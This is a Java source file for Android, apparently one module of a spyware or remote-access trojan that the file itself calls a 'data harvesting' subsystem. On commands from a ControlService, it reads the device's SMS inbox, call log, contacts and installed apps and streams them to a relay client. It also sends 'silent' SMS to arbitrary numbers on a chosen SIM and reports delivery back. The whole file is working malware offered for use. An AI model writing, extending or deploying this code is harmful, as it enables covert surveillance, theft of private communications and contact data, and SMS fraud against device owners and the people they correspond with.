/*
 * MODULE: TelemetryExtractor.java
 * PURPOSE: Data harvesting and communication subsystem combining database extraction (SMS, Calls, Contacts, Installed Apps) and multi-SIM background SMS transmission.
 *
 * DIRECT INBOUND CONNECTIONS:
 * - ControlService.java -> sendAppsList(), getSmsMessages(int), getCallLog(int), getContacts(), sendSilentSms(JSONObject)
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - RelayClient.java -> sendAppsList(String), sendSmsData(String, int), sendCallLog(String, int), sendContacts(String, int), sendLog(String)
 * - TelephonyManager / SmsManager -> Background SMS dispatching
 *
 * FUNCTION-BY-FUNCTION FLOW MAPPING:
 * - TelemetryExtractor(Context, String): Constructor, captures application context, androidId, and single-threaded worker executor.
 * - sendAppsList(): Queries PackageManager for user-installed non-system apps and streams JSON array.
 * - getSmsMessages(int): Queries content://sms/ provider for recent messages up to limit and streams results.
 * - getCallLog(int): Queries CallLog.Calls provider for recent inbound/outbound/missed calls and streams results.
 * - getContacts(): Queries ContactsContract phone numbers and names, streaming normalized contacts list.
 * - sendSilentSms(JSONObject): Resolves SIM slot subscription, manages single/multipart SMS payloads, and registers dynamic broadcast receiver for delivery confirmation.
 */
package com.device.ctrl;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class TelemetryExtractor {

    private final Context ctx;
    private final String androidId;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public TelemetryExtractor(Context ctx, String androidId) {
        this.ctx = ctx.getApplicationContext();
        this.androidId = androidId;
    }

    // ─── INSTALLED APPS ────────────────────────────────────────────────────────

    public void sendAppsList() {
        executor.execute(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                JSONArray arr = new JSONArray();
                for (ApplicationInfo app : apps) {
                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                        JSONObject o = new JSONObject();
                        o.put("name", pm.getApplicationLabel(app).toString());
                        o.put("package", app.packageName);
                        arr.put(o);
                    }
                }
                RelayClient.get().sendAppsList(arr.toString());
            } catch (Exception ignored) {}
        });
    }

    // ─── SMS LOGS ──────────────────────────────────────────────────────────────

    public void getSmsMessages(int limit) {
        executor.execute(() -> {
            JSONArray arr = new JSONArray();
            Cursor c = null;
            try {
                c = ctx.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, "date DESC LIMIT " + limit);
                if (c != null) {
                    int addrIdx = c.getColumnIndex("address");
                    int bodyIdx = c.getColumnIndex("body");
                    int dateIdx = c.getColumnIndex("date");
                    int readIdx = c.getColumnIndex("read");
                    while (c.moveToNext()) {
                        try {
                            JSONObject sms = new JSONObject();
                            String addr = addrIdx >= 0 && !c.isNull(addrIdx) ? c.getString(addrIdx) : "";
                            String body = bodyIdx >= 0 && !c.isNull(bodyIdx) ? c.getString(bodyIdx) : "";
                            long date = dateIdx >= 0 && !c.isNull(dateIdx) ? c.getLong(dateIdx) : 0L;
                            boolean read = readIdx >= 0 && !c.isNull(readIdx) && c.getInt(readIdx) == 1;
                            sms.put("from", addr);
                            sms.put("body", body);
                            sms.put("date", date);
                            sms.put("read", read);
                            arr.put(sms);
                        } catch (Exception ignored) {}
                    }
                }
            } catch (Exception ignored) {
            } finally {
                if (c != null) { try { c.close(); } catch (Exception ignored) {} }
            }
            RelayClient.get().sendSmsData(arr.toString(), arr.length());
        });
    }

    // ─── CALL LOGS ─────────────────────────────────────────────────────────────

    public void getCallLog(int limit) {
        executor.execute(() -> {
            JSONArray arr = new JSONArray();
            Cursor c = null;
            try {
                c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT " + limit);
                if (c != null) {
                    int numIdx = c.getColumnIndex(CallLog.Calls.NUMBER);
                    int dateIdx = c.getColumnIndex(CallLog.Calls.DATE);
                    int durIdx = c.getColumnIndex(CallLog.Calls.DURATION);
                    int typeIdx = c.getColumnIndex(CallLog.Calls.TYPE);
                    int nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    while (c.moveToNext()) {
                        try {
                            JSONObject call = new JSONObject();
                            String num = numIdx >= 0 && !c.isNull(numIdx) ? c.getString(numIdx) : "";
                            long date = dateIdx >= 0 && !c.isNull(dateIdx) ? c.getLong(dateIdx) : 0L;
                            long dur = durIdx >= 0 && !c.isNull(durIdx) ? c.getLong(durIdx) : 0L;
                            int type = typeIdx >= 0 && !c.isNull(typeIdx) ? c.getInt(typeIdx) : 0;
                            String name = nameIdx >= 0 && !c.isNull(nameIdx) ? c.getString(nameIdx) : "";
                            call.put("number", num);
                            call.put("date", date);
                            call.put("duration", dur);
                            call.put("type", type);
                            call.put("name", name);
                            arr.put(call);
                        } catch (Exception ignored) {}
                    }
                }
            } catch (Exception ignored) {
            } finally {
                if (c != null) { try { c.close(); } catch (Exception ignored) {} }
            }
            RelayClient.get().sendCallLog(arr.toString(), arr.length());
        });
    }

    // ─── CONTACTS ──────────────────────────────────────────────────────────────

    public void getContacts() {
        executor.execute(() -> {
            JSONArray arr = new JSONArray();
            Cursor c = null;
            try {
                c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC");
                if (c != null) {
                    int nameIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                    int numIdx = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    while (c.moveToNext()) {
                        try {
                            JSONObject ct = new JSONObject();
                            String name = nameIdx >= 0 && !c.isNull(nameIdx) ? c.getString(nameIdx) : "";
                            String num = numIdx >= 0 && !c.isNull(numIdx) ? c.getString(numIdx) : "";
                            ct.put("name", name);
                            ct.put("number", num);
                            arr.put(ct);
                        } catch (Exception ignored) {}
                    }
                }
            } catch (Exception ignored) {
            } finally {
                if (c != null) { try { c.close(); } catch (Exception ignored) {} }
            }
            RelayClient.get().sendContacts(arr.toString(), arr.length());
        });
    }

    // ─── SILENT SMS TRANSMISSION ───────────────────────────────────────────────

    public void sendSilentSms(JSONObject data) {
        if (data == null) return;
        String targetNumber = data.optString("number", "").trim();
        String messageText = data.optString("message", "").trim();
        int simSlot = data.optInt("slot", 0);

        if (targetNumber.isEmpty() || messageText.isEmpty()) {
            RelayClient.get().sendLog("⚠️ SMS dispatch canceled: empty number or message");
            return;
        }

        try {
            SmsManager smsManager = null;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SubscriptionManager sm = (SubscriptionManager) ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                if (sm != null && (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || ctx.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED)) {
                    List<SubscriptionInfo> list = sm.getActiveSubscriptionInfoList();
                    if (list != null && list.size() > simSlot) {
                        int subId = list.get(simSlot).getSubscriptionId();
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            SmsManager base = ctx.getSystemService(SmsManager.class);
                            if (base != null) {
                                smsManager = base.createForSubscriptionId(subId);
                            }
                        }
                        if (smsManager == null) {
                            smsManager = SmsManager.getSmsManagerForSubscriptionId(subId);
                        }
                    }
                }
            }

            if (smsManager == null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    smsManager = ctx.getSystemService(SmsManager.class);
                }
                if (smsManager == null) {
                    smsManager = SmsManager.getDefault();
                }
            }

            String sentAction = "SMS_SENT_ACTION_" + System.currentTimeMillis();
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent sentIntent = PendingIntent.getBroadcast(ctx, 0, new Intent(sentAction), flags);

            BroadcastReceiver receiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context arg0, Intent arg1) {
                    try {
                        String status;
                        switch (getResultCode()) {
                            case Activity.RESULT_OK:
                                status = "SENT SUCCESSFULLY";
                                break;
                            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                                status = "Generic Failure (Check Balance/Carrier)";
                                break;
                            case SmsManager.RESULT_ERROR_NO_SERVICE:
                                status = "No Cellular Service";
                                break;
                            case SmsManager.RESULT_ERROR_NULL_PDU:
                                status = "Null PDU Error";
                                break;
                            case SmsManager.RESULT_ERROR_RADIO_OFF:
                                status = "Radio / Airplane Mode OFF";
                                break;
                            default:
                                status = "Error Code " + getResultCode();
                                break;
                        }
                        RelayClient.get().sendLog("📩 SMS Delivery Status [" + targetNumber + "]: " + status);
                        ctx.unregisterReceiver(this);
                    } catch (Exception ignored) {}
                }
            };

            if (Build.VERSION.SDK_INT >= 34) {
                ctx.registerReceiver(receiver, new IntentFilter(sentAction), Context.RECEIVER_NOT_EXPORTED);
            } else {
                ctx.registerReceiver(receiver, new IntentFilter(sentAction));
            }

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    ctx.unregisterReceiver(receiver);
                } catch (Exception ignored) {}
            }, 15000);

            ArrayList<String> parts = smsManager.divideMessage(messageText);
            if (parts.size() > 1) {
                ArrayList<PendingIntent> sentIntents = new ArrayList<>();
                for (int i = 0; i < parts.size(); i++) {
                    sentIntents.add(sentIntent);
                }
                smsManager.sendMultipartTextMessage(targetNumber, null, parts, sentIntents, null);
            } else {
                smsManager.sendTextMessage(targetNumber, null, messageText, sentIntent, null);
            }

            RelayClient.get().sendLog("📩 Dispatching SMS to " + targetNumber + " via SIM slot " + (simSlot + 1));
        } catch (Exception e) {
            RelayClient.get().sendLog("❌ SMS dispatch exception: " + e.getMessage());
        }
    }
}
